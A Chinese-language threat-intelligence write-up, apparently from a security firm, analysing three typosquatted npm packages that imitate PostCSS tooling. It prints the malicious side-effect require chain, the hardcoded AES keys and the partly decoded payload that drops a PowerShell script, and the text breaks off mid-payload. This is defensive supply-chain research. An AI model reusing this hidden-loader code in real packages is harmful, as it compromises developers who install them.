---
title: 威胁情报｜PostCSS 伪装 npm 包三件套关联攻击链分析
url: https://mp.weixin.qq.com/s/GvRuo-ngbFjzkW6MvpWG8w
source: Doonsec's feed
date: 2026-06-26
fetch_date: 2026-06-27T05:45:50.819026
---

# 威胁情报｜PostCSS 伪装 npm 包三件套关联攻击链分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/8z8bibAexaCJ0CxoUO4E7KZa0cepSuR9icETT8hRSbwQ7u9tOpgpeqw8GuV1K9HE5icfI02eWjMPx7x3erj9o3CKv5Oe8iaia1332C0iaSPGxOXXI/0?wx_fmt=jpeg)

# 威胁情报｜PostCSS 伪装 npm 包三件套关联攻击链分析

原创

慢雾安全团队
慢雾安全团队

慢雾科技

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

********# 背景******

********#

近日，MistEye 安全监控系统在一次恶意 npm 包事件中关联到三个相互勾连的样本，分别为 postcss-minify-selector-0.1.9、postcss-minify-selector-parser-1.0.16 和 aes-decode-runner-pro-1.0.11。三个样本均在包名、README 和源码组织方式上刻意模仿 PostCSS 与 CSS selector parser 生态，且采用 typosquatting 手法——通过细微的拼写差异——来冒充高下载量的合法包。

需要特别说明的是，这三个包的全版本均为恶意——即 postcss-minify-selector、postcss-minify-selector-parser 和 aes-decode-runner-pro 从发布至今的每一个版本都内置了隐藏执行框架。本文选取其中三个代表性版本（0.1.9、1.0.16、1.0.11）做深入解构，但 IOC 和处置建议适用于这三个包名的所有已发布版本。

其中最关键的是 postcss-minify-selector：攻击者将其命名为 postcss-minify-selector（注意末尾没有 "s"），而 npm 上存在一个合法包 postcss-minify-selectors（末尾带 "s"）——该合法包属于 cssnano 工具链，是 PostCSS 生态中标准 CSS 压缩流程的一部分，周下载量高达 1836 万次。攻击者仅从包名中去掉一个字母 "s"，再利用相同的 description（"Minify selectors with PostCSS."）、相同的 keywords（cssnano、postcss-plugin）和相似的 README，让开发者在手误或视觉疏忽时将恶意包当作合法包引入项目。postcss-minify-selector-parser 则进一步伪装为合法的 postcss-selector-parser（周下载量超 1.5 亿）的姊妹包，aes-decode-runner-pro 伪装为专业 AES 加解密工具。

这三个样本并非彼此孤立的独立事件。postcss-minify-selector-0.1.9 的入口文件在被 require() 时立即将控制流导向 postcss-minify-selector-parser 的恶意子路径；postcss-minify-selector-parser-1.0.16 在 AES-GCM 解密管线中隐藏了多阶段载荷，最终落地 PowerShell 并从伪装成 NVIDIA 驱动更新的域名下载 Windows 二阶段文件；aes-decode-runner-pro-1.0.11 则与执行器共享同一套代码骨架与加密材料，但默认密文仅为无害日志输出，更像是同家族攻击框架的前身或试验型样本。JFrog 安全研究团队于 2026 年 6 月 22 日发布的《From PostCSS Masquerading to Windows RAT》同样将这组包归为同一攻击事件，并追踪到同一 npm 发布账号。本文在 JFrog 公开情报的基础上，通过项目内静态解包工具与逐文件源码比对，对三个样本之间的同源关系和武器化演进路径做了独立交叉验证。

# MistEye 响应********

********#

MistEye 是由 SlowMist 自主研发的 Web3 威胁情报与动态安全监控系统，集成了安全监控与情报聚合能力，为用户提供实时的风险预警与资产守护。

在捕获本次 PostCSS 伪装 npm 包事件及其关联样本后，MistEye 已对三个包的导入链、依赖链、隐藏执行链和代码同源关系完成还原，提取出下载域名、远程 URL、样本哈希与落地文件名等核心 IOC，并通过项目内 scripts/js\_static\_unpack.py 与 tools/node-decoder-runner/runner.mjs 在不执行样本的前提下恢复出隐藏载荷的完整明文。情报详情：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCLc90OANSHRB0uMygsL6mCJcFw49jvUMXgfVPc9EQb5fhtFWwWuMTD2L9TGIjkfRoAns3VlIXF4fuYvkPKEStt79KkE8icDOeYE/640?wx_fmt=png&from=appmsg)

以下为详细技术分析。

# 攻击链分析********

********#

整条攻击链由三个样本分工协作构成，三个包的全版本均为恶意，以下选取代表性版本逐步拆解。

三个恶意包及其分析版本在攻击链中的角色如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCLau1KX5EP9flvxX6KpJX9cVllyTrNHRK1MgBze4fgxdtqMrCHUwPx6sRickWt2WKlpHG5UKNCX0umNiaafONgNYkiclja14aSNCc/640?wx_fmt=png&from=appmsg)********

******#******

******# 第一步：导流包 postcss-minify-selector-0.1.9 —— 在入口处将控制流导向恶意依赖******

********#

该包的 package.json 声明 main 为 src/index.js，并在 dependencies 中依赖 postcss-minify-selector-parser: ^1.0.16。在 npm 语义化版本规则下，^1.0.16 将解析到 1.0.16，这意味着只要安装此依赖，恶意版本就会被拉入 node\_modules。

文件：postcss-minify-selector-0.1.9/src/index.js（第1-6行）

```
  'use strict';   require('postcss-minify-selector-parser/cjs-runner');   const { dirname } = require('path');   const browserslist = require('browserslist');   const { isSupported } = require('caniuse-api');   const parser = require('postcss-minify-selector-parser/selector-parser');
```

注意第2行的写法——require('postcss-minify-selector-parser/cjs-runner')，没有赋值给任何变量，也没有放在条件分支里。这种写法叫"仅导入不引用"，意味着只要 Node.js 加载这个文件，就会自动执行这一行，不需要任何额外操作。此时后面正常的 CSS 压缩逻辑——attribute 去引号、combinator 合并、pseudo 折叠、tag 替换、universal 移除等——还没开始跑，恶意代码先获得了执行权。

需要强调的是，该包自身不含生命周期脚本、网络通信、子进程启动或文件写入行为。独立扫描视角下它看起来"良性"，但它的设计目的并非自己作恶，而是把 require() 流量静默导向 postcss-minify-selector-parser 的隐藏执行入口。这是一种导入阶段的供应链导流攻击。

# 第二步：主执行器 postcss-minify-selector-parser-1.0.16 —— 公开导出 cjs-runner 子路径以连接隐藏执行链********

********#

该包在 README 中自称 CSS selector 解析库，但在 package.json 中为隐藏执行链准备了公开入口：

文件：postcss-minify-selector-parser-1.0.16/package.json（exports 片段）

```
  "exports": {     ".": "./index.js",     "./custom-codec": "./src/index.js",     "./selector-parser": "./src/selector-parser.js",     "./cjs-runner": "./cjs-runner.js"  },
```

文件：postcss-minify-selector-parser-1.0.16/cjs-runner.js（完整内容）

```
  require("./scripts/cjs-runner");
```

**文件：postcss-minify-selector-parser-1.0.16/scripts/cjs-runner.js（完整内容）**

```
  const { runDefaultDecodedFunction } = require("../src");
   runDefaultDecodedFunction();
```

从 postcss-minify-selector-0.1.9 的 require('postcss-minify-selector-parser/cjs-runner') → cjs-runner.js → scripts/cjs-runner.js → runDefaultDecodedFunction()，整条链路无任何条件分支或用户交互要求，完全自动化。

单纯 require("postcss-minify-selector-parser") 不会触发此链——它只会加载 src/index.js 并将隐藏配置加载进内存。真正触发执行的入口是 cjs-runner.js、scripts/cjs-runner.js、runtime/lib.min.js 这些显式的 runner 入口。而这恰好与 postcss-minify-selector-0.1.9 的副作用导入完全对接。

值得额外注意的是 src/index.js 的导出设计。该文件不仅公开了 AES-GCM 加解密函数和 decodeAndRunPlain、finalFinalDecodeAndRun、runDefaultDecodedFunction 等危险函数，还将 run 作为 runDefaultDecodedFunction 的别名导出，并使用 ...selectorParser 展开运算符将合法包 postcss-selector-parser 的全部 API 合并导出：

```
  module.exports = {   DEFAULT_POSITION_OPTIONS,   DEFAULT_CODEC_OPTIONS,   DEFAULT_AES_SALT,   DEFAULT_AES_PASSPHRASE,   DEFAULT_FINAL_ENCODED_TEXT,   encryptAesGcm,   decryptAesGcm,   customEncode,   customEncodeFromDoubleEncoded,   customDecode,   decodeAndRunPlain,   finalFinalDecodeToFunction,   finalFinalDecodeAndRun,   decodeDefaultFinalText,   runDefaultDecodedFunction,   run: runDefaultDecodedFunction,   resolveConfig,   selectorParser,   postcssSelectorParser: selectorParser,   ...selectorParser,  // 展开合法 postcss-selector-parser 的全部 API  };
```

这一设计使得 require("postcss-minify-selector-parser") 返回的对象既包含 isPseudo、isCombinator、isAttribute 等正常的 CSS selector 工具函数，又暗藏 run() / runDefaultDecodedFunction() / decodeAndRunPlain() 等执行入口。对审查者而言，包看起来就是对 postcss-selector-parser 的功能增强封装；对攻击者而言，所有执行能力都已公开可用。

# 第三步：密文解码 —— 三层包装 + 硬编码密钥 + new Function 动态执行********

********#

攻击者把恶意代码藏在三个嵌套的壳里，每一层都需要对应的"钥匙"才能解开。三层壳的嵌套顺序是：最外层 AES-256-GCM 加密 → 中间层位置打乱编码 → 最内层字符替换编码。解开这三层后，才能看到真正的恶意 JS 代码。

使用项目内 tools/node-decoder-runner/runner.mjs 和 scripts/js\_static\_unpack.py（均设置 executed\_sample\_code=false，只读不执行）逐层解码，恢复出以下明文。

两个包共享完全相同的"钥匙"——盐值、口令、打乱参数全部一样：

```
  const DEFAULT_POSITION_OPTIONS = { shift: 4, unit: "_u_", interval: 3 };   const DEFAULT_CODEC_OPTIONS = { shift: 4, unit: "_u_", interval: 3, shuffleSeed: 2026, useBase64: true };   const DEFAULT_AES_SALT = "encode-npm-c-salt";   const DEFAULT_AES_PASSPHRASE = "default-dev-passphrase";
```

唯一不同是密文本身（DEFAULT\_FINAL\_ENCODED\_TEXT），即外面那层壳里的具体内容：

aes-decode-runner-pro-1.0.11 解码结果（39 字节）：

```
console.log("AES decode runner ready");
```

只是一个无害的打印语句。

postcss-minify-selector-parser-1.0.16 解码结果（1539 字节，SHA256: 48b2cbe992310360aa88be29f533a21b2cd36bc4ec07b3180babb3449a5f180b）：

```
const a=(()=>{       const fs=require("fs"),      filename="../../settings.ps1",      key="AB59097(*^^zxcvbn",      number="69 52 42 52 105 59 38 42 113 152 90 193 178 91 189 167 177 67 59 38 102 67 91 81 63 53 78 92 115 143 105 105 102 109 122 47 51 48 117 128 54 27 29 85 139 178 176 92 103 96 113 63 72 56 46 46 42 57 29 99 87 96 109 176 84 120 87 95 119 117 105 110 104 41 53 33 33 100 81 126 119 157 101 101 158 68 123 37 55 41 101 126 74 25 85 100 115 123 157 156 87 114 64 64 38 59 119 115 88 32 31 98 96 193 178 122 124 85 109 136 135 120 59 41 42 100 59 76 120 117 133 104 97 111 121 116 52 70 52 114 29 55 46 109 113 152 129 124 108 86 116 91 116 52 64 45 50 71 63 42 39 113 163 161 124 113 84 163 117 144 91 89 64 41 46 50 78 46 29 98 93 191 164 170 102 86 114 54 64 44 44 119 126 122 42 35 79 139 141 154 125 141 109 94 63 59 76 63 35 61 54 51 28 85 97 128 107 101 175 83 115 53 135";      // XOR/减法解码：对每个 number[i]，用 key[j] + 103 做计算      if(!number.trim())throw new Error("NUMBERS is empty.");      const parts=number.split(/\s+/).filter(p=>p!==" "),     keyBytes=Buffer.from(key,"utf8"),output=[];      let j=0;      for(let i=0;i<parts.length;i++){      const num=parseInt(parts[i],10);      let k=keyBytes[j]+103;    output.push(k>=num?k-num:num);      j++;      if(j===keyBytes.length)j=0;      }      let decoded;      try{decoded=Buffer.from(output).toString("utf8")}      catch{decoded=...